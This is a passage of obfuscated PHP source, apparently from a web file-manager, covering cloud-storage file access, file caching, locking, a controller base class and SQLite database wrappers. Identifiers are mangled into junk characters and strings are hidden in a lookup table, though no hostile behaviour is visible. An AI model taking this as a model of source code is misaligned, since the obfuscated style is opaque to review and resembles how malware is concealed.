"\72\57\x2f\165\160\154\157\x61\144{$õåœÂîÉ}\56\161\x69\156\x69\x75\x70\x2e\x63\x6f\x6d\57"; return array($‚¨°ŸÍ [1538] => $âÒ±Ç¨£, $‚¨°ŸÍ [1539] => $ø¨ñüûÕ); } public function download($Îş‡äî, $¡¢óÈÖ) { $Ö—Ÿê = IO::getPathInner(IO::mkfile($¡¢óÈÖ)); if (!($¾Ì„Ùµ = $this->link($Îş‡äî))) { return !1; } $Ô‹áîşÌ = 0; $èšÆ¾­ = 1024 * 200; $Ô‚Ë»‘¸ = fopen($Ö—Ÿê, $_SERVER[°‰†òö¯][1540]); while (!0) { $ÖøïŸÊì = $this->fileSubstr($Îş‡äî, $Ô‹áîşÌ, $èšÆ¾­); if ($ÖøïŸÊì === !1) { return !1; } fwrite($Ô‚Ë»‘¸, $ÖøïŸÊì); $Ô‹áîşÌ += $èšÆ¾­; if (strlen($ÖøïŸÊì) < $èšÆ¾­) { break; } } fclose($Ô‚Ë»‘¸); return $¡¢óÈÖ; } public function link($¿“½ú¢, $µİ‡ç•Õ = '') { if (!$this->isFile($¿“½ú¢)) { return !1; } $ä‘’ÏÁ = $this->getHost() . $_SERVER[°‰†òö¯][8] . $this->pathEncode($¿“½ú¢) . $µİ‡ç•Õ; return $this->auth->privateDownloadUrl($ä‘’ÏÁ, 3600 * 12); } public function fileOut($úôåæË…, $áº¥ºó = false, $ÌÇÂû†¥ = false, $ªø¹ŞŸí = '') { $¹‹¦¡ìî =& $_SERVER[°‰†òö¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($úôåæË…, $áº¥ºó, $ÌÇÂû†¥, $ªø¹ŞŸí); } if (!$ÌÇÂû†¥) { $ÌÇÂû†¥ = $this->pathThis($úôåæË…); } $ƒÎïÀ = $áº¥ºó ? $¹‹¦¡ìî[1541] . rawurlencode($ÌÇÂû†¥) : $¹‹¦¡ìî[12]; $Ïº‘Ç¦‚ = $this->link($úôåæË…, $ƒÎïÀ); $this->fileOutLink($Ïº‘Ç¦‚); } public function fileOutServer($åè°ˆÅƒ, $ÁÒµóÄ = false, $Ì ÛèÉÃ = false, $¼ƒìæµ« = '') { parent::fileOut($åè°ˆÅƒ, $ÁÒµóÄ, $Ì ÛèÉÃ, $¼ƒìæµ«); } public function fileOutImage($Ğñ±¤Àè, $¢÷İ…ş = 250) { if ($this->size($Ğñ±¤Àè) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ğñ±¤Àè, $¢÷İ…ş); } $‰„äòÂí = $this->link($Ğñ±¤Àè, $_SERVER[°‰†òö¯][1542] . $¢÷İ…ş); $this->fileOutLink($‰„äòÂí); } public function fileOutImageServer($ÜÚñí¡Ñ, $öİˆ³şñ = 250) { parent::fileOutImage($ÜÚñí¡Ñ, $öİˆ³şñ); } public function hashMd5($µ¼¬œ¬û) { $ĞíÂâŞ =& $_SERVER[°‰†òö¯]; $ğ¼ğ”ˆ = $this->objectMeta($µ¼¬œ¬û); return isset($ğ¼ğ”ˆ[$ĞíÂâŞ[247]]) ? $ğ¼ğ”ˆ[$ĞíÂâŞ[247]] : !1; $ÔÜ½Š¢ = $this->link($µ¼¬œ¬û, $ĞíÂâŞ[1543]); } public function size($ ±ÕÂéƒ) { $®ÅöĞå˜ = $this->objectMeta($ ±ÕÂéƒ); return $®ÅöĞå˜ ? $®ÅöĞå˜[$_SERVER[°‰†òö¯][79]] : 0; } public function info($½œì«) { if ($this->isFolder($½œì«)) { return $this->folderInfo($½œì«); } else { if ($this->isFile($½œì«)) { return $this->fileInfo($½œì«); } } return !1; } public function exist($È®¨¾Œì) { return $this->isFile($È®¨¾Œì) || $this->isFolder($È®¨¾Œì); } public function isFile($ûî¡Ô¥¤) { return !$this->isFolder($ûî¡Ô¥¤) && $this->objectMeta($ûî¡Ô¥¤); } public function isFolder($›Ä·‘¦Ë) { return $this->cacheMethod($_SERVER[°‰†òö¯][179], $›Ä·‘¦Ë); } protected function objectMeta($‰…Á’˜) { return $this->cacheMethod($_SERVER[°‰†òö¯][181], $‰…Á’˜); } protected function _objectMeta($ßô¥ü¾×) { $½”ÔÖºĞ =& $_SERVER[°‰†òö¯]; list($ıÒ‰ô›˜, $È¸—²™„) = $this->bucketManager->stat($this->bucket, $ßô¥ü¾×); if ($ıÒ‰ô›˜) { $ıÒ‰ô›˜[$½”ÔÖºĞ[79]] = intval($ıÒ‰ô›˜[$½”ÔÖºĞ[1529]]); } return $ıÒ‰ô›˜; } protected function _isFolder($·Ûî¯†) { $ñÂğïê =& $_SERVER[°‰†òö¯]; if ($·Ûî¯† == $ñÂğïê[12] || $·Ûî¯† == $ñÂğïê[8]) { return !0; } list($Çñ™Ó¬á, $—±İİşƒ) = $this->bucketManager->listFiles($this->bucket, trim($·Ûî¯†, $ñÂğïê[8]) . $ñÂğïê[8], $ñÂğïê[12], 1, $ñÂğïê[8]); return !empty($Çñ™Ó¬á[$ñÂğïê[1532]]) || !empty($Çñ™Ó¬á[$ñÂğïê[1533]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($˜ñ›ˆè, $¡ÄÖüŒÌ = 0) { parent::__construct(); $this->source = $˜ñ›ˆè; $this->sourceSize = $¡ÄÖüŒÌ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÌôÆ’é¨ = false) { return $this->sourceSize; } public function getContent($ÑŞŸ¢Œ = false) { return $this->fileSubstr($ÑŞŸ¢Œ, 0, $this->sourceSize); } public function fileSubstr($ÌúâŞú¿ = false, $·ì»Ş«ö = 0, $º¦–àÓ = 0) { if (!$º¦–àÓ) { $º¦–àÓ = $this->sourceSize; } $¡ì¹ÃËš = $this->sourceSize - $·ì»Ş«ö; if ($º¦–àÓ >= $¡ì¹ÃËš) { $º¦–àÓ = $¡ì¹ÃËš; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $·ì»Ş«ö, $º¦–àÓ); } if ($this->sourceType == self::TYPE_FILE) { if ($º¦–àÓ <= 0) { return $_SERVER[°‰†òö¯][12]; } $è½ñÉÓ = ftell($this->source); fseek_64($this->source, $è½ñÉÓ + $·ì»Ş«ö); $ï®¨¡à = @fread($this->source, $º¦–àÓ); fseek_64($this->source, $è½ñÉÓ); return $ï®¨¡à; } } public function hashMd5($§õÄ©­‹ = false) { return md5($this->getContent()); } public static function hash($ßØö›í», $®ëúºÑº = 0) { $ŒĞû‹·Š = new PathDriverStream($ßØö›í», $®ëúºÑº); return $ŒĞû‹·Š->hashSimple($ßØö›í»); } public static function md5($ØŠ¬òØ, $ÅôÈöÎÇ = 0) { $ÃİÆ¨ÎÛ = new PathDriverStream($ØŠ¬òØ, $ÅôÈöÎÇ); return $ÃİÆ¨ÎÛ->hashMd5($ØŠ¬òØ); } } goto CùÍ–¬ÀÙ¦; A¯‰÷÷é§õ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($§™”ËØõ, $œ©÷í”¶) { $Åµ ”û¹ =& $_SERVER[°‰†òö¯]; $this->cachePath = $§™”ËØõ[$Åµ ”û¹[87]]; $this->prefix = $Åµ ”û¹[901]; $this->cacheTime = $œ©÷í”¶; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($— Î‘âà) { $™øŠË– =& $_SERVER[°‰†òö¯]; $— Î‘âà = str_replace(array($™øŠË–[902], $™øŠË–[100], $™øŠË–[76]), $™øŠË–[903], $— Î‘âà); return $this->cachePath . $™øŠË–[904] . $— Î‘âà . $™øŠË–[905]; } public function set($Í÷Ê ©ğ, $ÃÒòÖ¼¬, $Ñ¥¬İÇ· = false) { $Ñ¥¬İÇ· = $Ñ¥¬İÇ· ? $Ñ¥¬İÇ· : $this->cacheTime; $ ·Çù–â = $this->getFile($Í÷Ê ©ğ); if (file_put_contents($ ·Çù–â, $this->prefix . $ÃÒòÖ¼¬, LOCK_EX)) { @touch($ ·Çù–â, intval(time() + $Ñ¥¬İÇ·)); clearstatcache(); return !0; } @unlink($ ·Çù–â); return !1; } public function get($Õ·«¸”ú) { $›ŞÈØŸ = $this->getFile($Õ·«¸”ú); if (file_exists($›ŞÈØŸ) && filemtime($›ŞÈØŸ) < time()) { @unlink($›ŞÈØŸ); return !1; } $Ùı¨°Ô = @file_get_contents($›ŞÈØŸ); return substr($Ùı¨°Ô, strlen($this->prefix)); } public function remove($ÅæÀøŒÂ) { $®ğÀœø = $this->getFile($ÅæÀøŒÂ); return @unlink($®ğÀœø); } public function deleteAll() { $¼ôˆ´¢ƒ =& $_SERVER[°‰†òö¯]; $„Ï”Ö Ê = scandir($this->cachePath); foreach ($„Ï”Ö Ê as $Ãøšì¸) { $•îˆÕâË = $this->cachePath . $Ãøšì¸; if (strpos($•îˆÕâË, $¼ôˆ´¢ƒ[905]) && strpos($•îˆÕâË, $¼ôˆ´¢ƒ[906])) { @unlink($•îˆÕâË); } } } public function clearTimeout() { $±‹ñˆèç =& $_SERVER[°‰†òö¯]; $ØÃ˜Ê¥Ö = scandir($this->cachePath); foreach ($ØÃ˜Ê¥Ö as $ûúÄ£ñê) { $©üé¢ÏÉ = $this->cachePath . $ûúÄ£ñê; if (strpos($©üé¢ÏÉ, $±‹ñˆèç[905]) && strpos($©üé¢ÏÉ, $±‹ñˆèç[906]) && filemtime($©üé¢ÏÉ) < time()) { @unlink($©üé¢ÏÉ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÍøÖÙç† =& $_SERVER[°‰†òö¯]; if (self::$handle) { return self::$handle; } $«Æ¬¡ŒÔ = $GLOBALS[$ÍøÖÙç†[6]][$ÍøÖÙç†[426]]; self::$timeout = $«Æ¬¡ŒÔ[$ÍøÖÙç†[907]] ? $«Æ¬¡ŒÔ[$ÍøÖÙç†[907]] : 10; $Õëá¤ó = _get($GLOBALS[$ÍøÖÙç†[6]], $ÍøÖÙç†[908]); $®ØíÜŞö = $«Æ¬¡ŒÔ[$ÍøÖÙç†[893]] ? $«Æ¬¡ŒÔ[$ÍøÖÙç†[893]] : $ÍøÖÙç†[232]; if ($®ØíÜŞö == $ÍøÖÙç†[21] && $Õëá¤ó == $ÍøÖÙç†[13]) { $®ØíÜŞö = $ÍøÖÙç†[232]; } switch ($®ØíÜŞö) { case $ÍøÖÙç†[896]: self::$handle = new CacheLockRedis(); break; case $ÍøÖÙç†[897]: self::$handle = new CacheLockMemcached(); break; case $ÍøÖÙç†[21]: self::$handle = new CacheLockDatabase(); break; case $ÍøÖÙç†[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÍøÖÙç†[909], $ÍøÖÙç†[910]); } return self::$handle; } private static function key($øïì¸ÖÕ) { return $_SERVER[°‰†òö¯][911] . Cache::key($øïì¸ÖÕ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¼¡Ôâç» = '') { self::$errorMsg = $¼¡Ôâç»; } public static function lockGlobal($¦ê¤øµ¸, $¨ÖÛÎ™Ò) { return self::lock($¦ê¤øµ¸, $¨ÖÛÎ™Ò, !0); } public static function lock($ßÂã°ƒŞ, $ŒÀòõÇÕ = false, $øö„÷Ã³ = false) { $Œ¯ôÆ© =& $_SERVER[°‰†òö¯]; $‚ù×¯† = self::init(); $È½°ºß™ = self::key($ßÂã°ƒŞ); $ŒÀòõÇÕ = $ŒÀòõÇÕ ? $ŒÀòõÇÕ : self::$timeout; $ìŞôáĞæ = timeFloat(); if ($GLOBALS[$Œ¯ôÆ©[912]]) { if (!$‚ù×¯†->lock($È½°ºß™, 0.2)) { die; } return !0; } $òæ“ö’é = $‚ù×¯†->lock($È½°ºß™, $ŒÀòõÇÕ); $õŞŞ¿êÜ = timeFloat(); if (!$òæ“ö’é) { $ÏÑ±Şã = "\x6c\157\143\x6b\40\x65\162\x72\157\162\x3b\x6b\x65\171\75{$ßÂã°ƒŞ}\73\164\151\x6d\x65\75{$ŒÀòõÇÕ}\x3b" . self::$errorMsg . $Œ¯ôÆ©[74] . get_caller_msg(); $ßÁÅ¸ª = LNG($Œ¯ôÆ©[913]) . "\x28{$ŒÀòõÇÕ}\x73\51\x2e" . LNG($Œ¯ôÆ©[914]); $ßÁÅ¸ª .= $Œ¯ôÆ©[915]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ßÁÅ¸ª = $ßÁÅ¸ª . $Œ¯ôÆ©[916] . self::$errorMsg; } write_log($Œ¯ôÆ©[917] . sprintf($Œ¯ôÆ©[918], timeFloat() - $ìŞôáĞæ) . $Œ¯ôÆ©[919] . $ÏÑ±Şã . $Œ¯ôÆ©[920] . json_encode(error_get_last()), $Œ¯ôÆ©[910]); show_json($ßÁÅ¸ª, !1); } if (!$øö„÷Ã³) { self::$lockItem[$È½°ºß™] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Æ¬ş¥³± = number_format(timeFloat() - $õŞŞ¿êÜ, 3); write_log($Œ¯ôÆ©[921] . $ßÂã°ƒŞ . $Œ¯ôÆ©[922] . $Æ¬ş¥³±, $Œ¯ôÆ©[910]); } return $òæ“ö’é; } public static function lockGet($‘àİÙìË) { $™ñ¾ñõ÷ = self::key($‘àİÙìË); if (self::$lockItem[$™ñ¾ñõ÷]) { return self::$lockItem[$™ñ¾ñõ÷]; } return self::init()->lockGet($™ñ¾ñõ÷); } public static function unlock($Ö„ëı ) { $é­›İó© =& $_SERVER[°‰†òö¯]; $±Ş¶¼¹ = self::key($Ö„ëı ); self::$lockItem[$±Ş¶¼¹] = null; self::init()->unlock($±Ş¶¼¹); if (GLOBAL_DEBUG_LOG_ALL) { write_log($é­›İó©[923] . $Ö„ëı , $é­›İó©[910]); } return; } public static function unlockRuntime() { $İôÅË =& $_SERVER[°‰†òö¯]; $’ö¹›²À = self::init(); $Ù¡ˆıöÒ = !1; foreach (self::$lockItem as $Ùø½¼ß˜ => $à¸Î¹ïğ) { if (!$à¸Î¹ïğ) { continue; } $’ö¹›²À->unlock($Ùø½¼ß˜); if (!$Ù¡ˆıöÒ) { $Ù¡ˆıöÒ = !0; write_log($İôÅË[924] . $Ùø½¼ß˜ . $İôÅË[74] . get_caller_msg(), $İôÅË[910]); continue; } write_log($İôÅË[924] . $Ùø½¼ß˜, $İôÅË[910]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $óë›Èóâ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($İôÅË[925] . $óë›Èóâ . $İôÅË[926] . ACTION, $İôÅË[910]); } } public static function fileLock($ÀŞåğ©–) { $ÃíÀ„¿¨ =& $_SERVER[°‰†òö¯]; if (!$GLOBALS[$ÃíÀ„¿¨[927]]) { $GLOBALS[$ÃíÀ„¿¨[927]] = array(); } $GLOBALS[$ÃíÀ„¿¨[927]][$ÀŞåğ©–] = !1; $¬ñûëÂõ = fopen(DATA_PATH . $ÀŞåğ©– . $ÃíÀ„¿¨[928], $ÃíÀ„¿¨[929]); if (!$¬ñûëÂõ) { return !1; } $GLOBALS[$ÃíÀ„¿¨[927]][$ÀŞåğ©–] = $¬ñûëÂõ; if (flock($¬ñûëÂõ, LOCK_EX)) { return !0; } self::unlock($ÀŞåğ©–); show_json($ÃíÀ„¿¨[930], !1); return !1; } public static function fileUnlock($Ï‚°û‡) { $òÒ”˜È¬ =& $_SERVER[°‰†òö¯]; $ŠÉ°Æş§ = $GLOBALS[$òÒ”˜È¬[927]][$Ï‚°û‡]; if (!$ŠÉ°Æş§) { return; } $GLOBALS[$òÒ”˜È¬[927]][$Ï‚°û‡] = !1; flock($ŠÉ°Æş§, LOCK_UN); fclose($ŠÉ°Æş§); } public static function fileUnlockAll() { $Ÿâ‡¸­ª =& $_SERVER[°‰†òö¯]; if (!isset($GLOBALS[$Ÿâ‡¸­ª[927]]) || !$GLOBALS[$Ÿâ‡¸­ª[927]]) { return; } foreach ($GLOBALS[$Ÿâ‡¸­ª[927]] as $úõŒ©¿ => $”€ÉƒŸ­) { if (!$”€ÉƒŸ­) { continue; } $GLOBALS[$Ÿâ‡¸­ª[927]][$úõŒ©¿] = !1; flock($”€ÉƒŸ­, LOCK_UN); fclose($”€ÉƒŸ­); } $GLOBALS[$Ÿâ‡¸­ª[927]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto CÄÏèù›; Fä¿È¸£½¿: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $®´ıà½â =& $_SERVER[°‰†òö¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$®´ıà½â[6]] =& $config; $this->values[$®´ıà½â[7]] =& $in; $this->tpl = TEMPLATE . MOD . $®´ıà½â[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¢“Â×Û) { if (1 === func_num_args()) { $this->{$¢“Â×Û} = new $¢“Â×Û(); } else { $­®…üû½ = new ReflectionClass($¢“Â×Û); $Ø”Àô’ = func_get_args(); array_shift($Ø”Àô’); $this->{$¢“Â×Û} = $­®…üû½->newInstanceArgs($Ø”Àô’); } return $this->{$¢“Â×Û}; } public function routeBind($øïò‹‹ú, $óƒ„Ëá…, $É­Ş‡®Ö = 3) { $®–åìäÇ =& $_SERVER[°‰†òö¯]; $Ô´Şª×õ = $this->in[$®–åìäÇ[9]]; $øïò‹‹ú = str_replace($®–åìäÇ[10], $®–åìäÇ[11], trim(trim($øïò‹‹ú, $®–åìäÇ[8]), $®–åìäÇ[12])); if (!$øïò‹‹ú || count($Ô´Şª×õ) <= $É­Ş‡®Ö) { return !1; } $ïŒîÑØ = !0; $…°êÈáã = explode($®–åìäÇ[8], $øïò‹‹ú); for ($ˆË©ì• = 0; $ˆË©ì• < count($…°êÈáã); $ˆË©ì•++) { if ($…°êÈáã[$ˆË©ì•] != $Ô´Şª×õ[$É­Ş‡®Ö + $ˆË©ì•]) { $ïŒîÑØ = !1; break; } } if (!$ïŒîÑØ) { return; } call_user_func_array(array($this, $óƒ„Ëá…), array()); } public function routeArgs($¢şÌ”áà = 3) { $ù‰¥Ò = $this->in[$_SERVER[°‰†òö¯][9]]; if (count($ù‰¥Ò) <= $¢şÌ”áà) { return array(); } $Ÿìò ¾ = array(); for ($¿æ°çÈş = $¢şÌ”áà; $¿æ°çÈş < count($ù‰¥Ò); $¿æ°çÈş += 2) { $Ÿìò ¾[$ù‰¥Ò[$¿æ°çÈş]] = $ù‰¥Ò[$¿æ°çÈş + 1]; $this->in[$ù‰¥Ò[$¿æ°çÈş]] = $ù‰¥Ò[$¿æ°çÈş + 1]; } return $Ÿìò ¾; } protected function assign($©½²ŠÈÍ, $£ŸÇÅòÁ) { $this->values[$©½²ŠÈÍ] = $£ŸÇÅòÁ; } protected function display($†®Ø¡¤Ä) { ob_end_clean(); extract($this->values); require $this->tpl . $†®Ø¡¤Ä; } } class DbSqliteBase extends Db { public function __construct($İ¡…ÈŒ‹ = '') { $•ô¬Êñ =& $_SERVER[°‰†òö¯]; if (!extension_loaded($•ô¬Êñ[13])) { think_exception(think_lang($•ô¬Êñ[14]) . $•ô¬Êñ[15]); } if (!empty($İ¡…ÈŒ‹)) { if (!isset($İ¡…ÈŒ‹[$•ô¬Êñ[16]])) { $İ¡…ÈŒ‹[$•ô¬Êñ[16]] = 438; } $this->config = $İ¡…ÈŒ‹; if (empty($this->config[$•ô¬Êñ[17]])) { $this->config[$•ô¬Êñ[17]] = array(); } } } public function connect($Ó›À«Û = '', $çî›ó‡Ë = 0) { $ƒ²¯—Û× =& $_SERVER[°‰†òö¯]; if (!isset($this->linkID[$çî›ó‡Ë])) { if (empty($Ó›À«Û)) { $Ó›À«Û = $this->config; } $ãÉ½—±ë = !empty($Ó›À«Û[$ƒ²¯—Û×[17]][$ƒ²¯—Û×[18]]) ? $Ó›À«Û[$ƒ²¯—Û×[17]][$ƒ²¯—Û×[18]] : $this->pconnect; $òà¸¹ = $ãÉ½—±ë ? $ƒ²¯—Û×[19] : $ƒ²¯—Û×[20]; $this->linkID[$çî›ó‡Ë] = $òà¸¹($Ó›À«Û[$ƒ²¯—Û×[21]], $Ó›À«Û[$ƒ²¯—Û×[16]]); if (!$this->linkID[$çî›ó‡Ë]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$çî›ó‡Ë], 30000); if (1 != think_config($ƒ²¯—Û×[22])) { unset($this->config); } } return $this->linkID[$çî›ó‡Ë]; } public function free() { $this->queryID = null; } public function query($©ıåë) { $ºŞèÕª¥ =& $_SERVER[°‰†òö¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $©ıåë; if ($this->queryID) { $this->free(); } think_action_status($ºŞèÕª¥[23], 1); think_status($ºŞèÕª¥[24]); $this->queryID = sqlite_query($this->_linkID, $©ıåë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¢²’²Ç = $this->getAll(); return $¢²’²Ç; } } public function execute($º±†×®) { $ƒËºŸØš =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º±†×®; if ($this->queryID) { $this->free(); } think_action_status($ƒËºŸØš[25], 1); think_status($ƒËºŸØš[24]); $²¥Â›­ˆ = sqlite_exec($this->_linkID, $º±†×®); $this->debug(); if (!1 === $²¥Â›­ˆ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[°‰†òö¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÈåÕ²Ö = sqlite_query($this->_linkID, $_SERVER[°‰†òö¯][27]); if (!$ÈåÕ²Ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $îá¥ß»³ = sqlite_query($this->_linkID, $_SERVER[°‰†òö¯][28]); if (!$îá¥ß»³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $”Î÷ØÄ© = array(); if ($this->numRows > 0) { for ($°ÒØ»åÌ = 0; $°ÒØ»åÌ < $this->numRows; $°ÒØ»åÌ++) { $”Î÷ØÄ©[$°ÒØ»åÌ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $”Î÷ØÄ©; } public function getFields($´« Ã¡õ) { $´Öáƒòœ =& $_SERVER[°‰†òö¯]; $›øÚ¯Š™ = $this->query($´Öáƒòœ[29] . $´« Ã¡õ . $´Öáƒòœ[30]); $Ô­‹·ˆÌ = array(); if ($›øÚ¯Š™) { foreach ($›øÚ¯Š™ as $ú«Ç§š => $Ü¸Ñİƒ‹) { $Ô­‹·ˆÌ[$Ü¸Ñİƒ‹[$´Öáƒòœ[31]]] = array($´Öáƒòœ[32] => $Ü¸Ñİƒ‹[$´Öáƒòœ[31]], $´Öáƒòœ[33] => $Ü¸Ñİƒ‹[$´Öáƒòœ[34]], $´Öáƒòœ[35] => (bool) ($Ü¸Ñİƒ‹[$´Öáƒòœ[36]] === $´Öáƒòœ[12]), $´Öáƒòœ[37] => $Ü¸Ñİƒ‹[$´Öáƒòœ[38]], $´Öáƒòœ[39] => strtolower($Ü¸Ñİƒ‹[$´Öáƒòœ[40]]) == $´Öáƒòœ[41], $´Öáƒòœ[42] => strtolower($Ü¸Ñİƒ‹[$´Öáƒòœ[43]]) == $´Öáƒòœ[44]); } } return $Ô­‹·ˆÌ; } public function getTables($ıÁ°ßş™ = '') { $©†ªÁÑ› =& $_SERVER[°‰†òö¯]; $ÍÅÙö¨‘ = $this->query($©†ªÁÑ›[45] . $©†ªÁÑ›[46] . $©†ªÁÑ›[47]); $Ø‹ƒÖ„û = array(); foreach ($ÍÅÙö¨‘ as $ãäœÌ¡Å => $½ƒ¯‡®„) { $Ø‹ƒÖ„û[$ãäœÌ¡Å] = current($½ƒ¯‡®„); } return $Ø‹ƒÖ„û; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ù‹ÊÆ¦é =& $_SERVER[°‰†òö¯]; $†è½ƒÅú = sqlite_last_error($this->_linkID); $this->error = $†è½ƒÅú . $ù‹ÊÆ¦é[4] . sqlite_error_string($†è½ƒÅú); if ($ù‹ÊÆ¦é[12] != $this->queryStr) { $this->error .= LNG($ù‹ÊÆ¦é[48]) . $this->queryStr; } think_trace($this->error, $ù‹ÊÆ¦é[12], $ù‹ÊÆ¦é[49]); return $this->error; } public function escapeString($Îö¶µ€§) { return sqlite_escape_string($Îö¶µ€§); } public function parseLimit($àŠŸ’ºì) { $›Ê¾Ñ½  =& $_SERVER[°‰†òö¯]; $ãª¤ß›‡ = $›Ê¾Ñ½ [12]; if (!empty($àŠŸ’ºì)) { $àŠŸ’ºì = explode($›Ê¾Ñ½ [50], $àŠŸ’ºì); if (count($àŠŸ’ºì) > 1) { $ãª¤ß›‡ .= $›Ê¾Ñ½ [51] . $àŠŸ’ºì[1] . $›Ê¾Ñ½ [52] . $àŠŸ’ºì[0] . $›Ê¾Ñ½ [53]; } else { $ãª¤ß›‡ .= $›Ê¾Ñ½ [51] . $àŠŸ’ºì[0] . $›Ê¾Ñ½ [53]; } } return $ãª¤ß›‡; } } class DbSqlite3Base extends Db { public function __construct($Â×ô—Î¶ = '') { $¼¿âÈ =& $_SERVER[°‰†òö¯]; if (!class_exists($¼¿âÈ[54])) { think_exception(think_lang($¼¿âÈ[14]) . $¼¿âÈ[55]); } if (!empty($Â×ô—Î¶)) { if (!isset($Â×ô—Î¶[$¼¿âÈ[16]])) { $Â×ô—Î¶[$¼¿âÈ[16]] = 438; } $this->config = $Â×ô—Î¶; if (empty($this->config[$¼¿âÈ[17]])) { $this->config[$¼¿âÈ[17]] = array(); } } } public function connect($£ìğº‰ = '', $¢› ûø = 0) { $ê­şşÜ =& $_SERVER[°‰†òö¯]; if (!isset($this->linkID[$¢› ûø])) { if (empty($£ìğº‰)) { $£ìğº‰ = $this->config; } $this->linkID[$¢› ûø] = new SQLite3($£ìğº‰[$ê­şşÜ[21]]); if (!$this->linkID[$¢› ûø]) { think_exception($this->linkID[$¢› ûø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¢› ûø]->busyTimeout(30000); if (1 != think_config($ê­şşÜ[22])) { unset($this->config); } } return $this->linkID[$¢› ûø]; } public function free() { $this->queryID = null; } public function query($äò¸½ûë) { $‚¨¶à†¸ =& $_SERVER[°‰†òö¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äò¸½ûë; if ($this->queryID) { $this->free(); } think_action_status($‚¨¶à†¸[23], 1); think_status($‚¨¶à†¸[24]); $this->queryID = $this->_linkID->query($äò¸½ûë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ØÔ«ó×Ç = $this->getAll(); $this->numRows = count($ØÔ«ó×Ç); return $ØÔ«ó×Ç; } } public function execute($¿˜Äô°®) { $­ı³ß£‚ =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¿˜Äô°®; if ($this->queryID) { $this->free(); } think_action_status($­ı³ß£‚[25], 1); think_status($­ı³ß£‚[24]); $«Šˆ¸¶ã = $this->_linkID->exec($¿˜Äô°®); $this->debug(); if (!1 === $«Šˆ¸¶ã) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[°‰†òö¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¥ö£ëÍ = $this->_linkID->query($_SERVER[°‰†òö¯][27]); if (!$¥ö£ëÍ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $£†á¢¸Ÿ = $this->_linkID->query($_SERVER[°‰†òö¯][28]); if (!$£†á¢¸Ÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¹î±øÈ = array(); while ($å³›“Ù = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¹î±øÈ[] = $å³›“Ù; } $this->queryID->reset(); return $¹î±øÈ; } public function getFields($÷«ç°Ñœ) { $Ëïİ´¢ñ =& $_SERVER[°‰†òö¯]; $ì ı‚¶ü = $this->query($Ëïİ´¢ñ[29] . $÷«ç°Ñœ . $Ëïİ´¢ñ[30]); $ªÅ²½Ëˆ = array(); if ($ì ı‚¶ü) { foreach ($ì ı‚¶ü as $”î ‘Ã˜ => $áĞ•‘À¸) { $ªÅ²½Ëˆ[$áĞ•‘À¸[$Ëïİ´¢ñ[32]]] = array($Ëïİ´¢ñ[32] => $áĞ•‘À¸[$Ëïİ´¢ñ[32]], $Ëïİ´¢ñ[33] => $áĞ•‘À¸[$Ëïİ´¢ñ[33]], $Ëïİ´¢ñ[35] => (bool) ($áĞ•‘À¸[$Ëïİ´¢ñ[35]] === $Ëïİ´¢ñ[12]), $Ëïİ´¢ñ[37] => $áĞ•‘À¸[$Ëïİ´¢ñ[56]], $Ëïİ´¢ñ[39] => (bool) $áĞ•‘À¸[$Ëïİ´¢ñ[57]], $Ëïİ´¢ñ[42] => (bool) $áĞ•‘À¸[$Ëïİ´¢ñ[57]]); } } return $ªÅ²½Ëˆ; } public function getTables($®¯¨öÔ = '') { $©ßÕÜñ‡ =& 